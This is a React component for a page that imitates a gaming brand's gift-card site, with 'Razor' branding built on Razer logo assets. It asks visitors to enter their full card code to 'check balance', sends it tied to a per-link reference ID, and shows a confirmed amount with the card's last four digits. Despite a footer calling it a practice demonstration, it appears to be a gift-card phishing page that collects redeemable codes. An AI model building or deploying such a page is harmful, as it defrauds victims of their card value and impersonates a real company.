import { useState } from 'react';
import { useParams } from 'react-router-dom';
import { useSubmissionViewModel } from '../../viewmodels/useSubmissionViewModel';
import ClientConfirmModal from './components/ClientConfirmModal';
import ResultBanner from './components/ResultBanner';
import styles from './GiftCardDemoPage.module.css';

const FOOTER_GROUPS = [
  {
    title: 'Shop',
    links: ['Gift cards', 'Digital products', 'Rewards'],
  },
  {
    title: 'Explore',
    links: ['Games', 'Entertainment', 'Community'],
  },
  {
    title: 'Support',
    links: ['Get help', 'FAQs', 'Accessibility'],
  },
  {
    title: 'Company',
    links: ['About', 'Privacy', 'Terms'],
  },
];


export default function GiftCardDemoPage() {
  const { ref = '' } = useParams();
  const vm = useSubmissionViewModel(ref, 16, 4, 'razor');
  const [menuOpen, setMenuOpen] = useState(false);
  const [expandedGroup, setExpandedGroup] = useState<string | null>(null);

  const loading = vm.result === 'loading';

  return (
    <div className={styles.page}>
      <header className={styles.header}>
        <div className={styles.headerInner}>
          <a className={styles.brand} href="#main" aria-label="Gift card demo home">
            <img
              src="/razor-banner_files/razer-logo.avif"
              alt="Razor Card"
              className={styles.brandImage}
            />
          </a>
          <nav className={styles.desktopNav} aria-label="Main navigation">
            <a href="#footer">Shop</a>
            <a href="#footer">Explore</a>
            <a href="#footer">Support</a>
          </nav>
          <button
            className={styles.menuButton}
            type="button"
            onClick={() => setMenuOpen((open) => !open)}
            aria-label={menuOpen ? 'Close menu' : 'Open menu'}
            aria-expanded={menuOpen}
          >
            <span />
            <span />
            <span />
          </button>
        </div>
        {menuOpen && (
          <nav className={styles.mobileNav} aria-label="Mobile navigation">
            <a href="#footer" onClick={() => setMenuOpen(false)}>Shop</a>
            <a href="#footer" onClick={() => setMenuOpen(false)}>Explore</a>
            <a href="#footer" onClick={() => setMenuOpen(false)}>Support</a>
          </nav>
        )}
      </header>

      <main className={styles.main} id="main">

        <section className={styles.content} aria-labelledby="page-title">
          <img
            src="/razor-banner_files/new-razer.jpg"
            alt="Razor gift card"
            className={styles.brandBanner}
          />
          <div className={styles.formPanel}>
            <h1 className={styles.title} id="page-title">Enter Your Card Code Here</h1>
            <input
              className={styles.input}
              id="demo-card-code"
              type="text"
              value={vm.code}
              onChange={(e) => vm.setCode(e.target.value)}
              placeholder="XXXX XXXX XXXX XXXX"
              autoComplete="off"
              spellCheck={false}
              disabled={loading}
              aria-describedby="demo-field-note"
            />

            <button
              className={styles.submitButton}
              type="button"
              onClick={() => {
                void vm.submit();
                vm.setCode('');
              }}
              disabled={!vm.isValid || loading}
            >
              {loading ? 'Checking…' : 'Check balance'}
            </button>
            <ResultBanner
              result={vm.result}
              amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
              theme="razzz"
            />
          </div>
        </section>
      </main>

      <footer className={styles.footer} id="footer">
        <div className={styles.footerGroups}>
          {FOOTER_GROUPS.map((group) => {
            const isExpanded = expandedGroup === group.title;
            const panelId = `footer-${group.title.toLowerCase()}`;

            return (
              <section className={styles.footerGroup} key={group.title}>
                <button
                  type="button"
                  className={styles.footerToggle}
                  aria-expanded={isExpanded}
                  aria-controls={panelId}
                  onClick={() => setExpandedGroup(isExpanded ? null : group.title)}
                >
                  <span>{group.title}</span>
                  <span className={styles.toggleMark} aria-hidden="true">
                    {isExpanded ? '−' : '+'}
                  </span>
                </button>
                <ul className={styles.footerLinks} id={panelId} hidden={!isExpanded}>
                  {group.links.map((link) => (
                    <li key={link}><a href="#main">{link}</a></li>
                  ))}
                </ul>
              </section>
            );
          })}
        </div>
        <div className={styles.legal}>
          <p>Practice interface demonstration. No affiliation with any gift-card issuer.</p>
          <div className={styles.legalLinks}>
            <a href="#footer">Terms</a>
            <a href="#footer">Privacy</a>
            <a href="#footer">Accessibility</a>
          </div>
        </div>
      </footer>

      <ClientConfirmModal
        open={vm.result === 'confirmed'}
        amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
        last4={vm.last4}
        onClose={vm.reset}
        theme="razzz"
      />
    </div>
  );
}
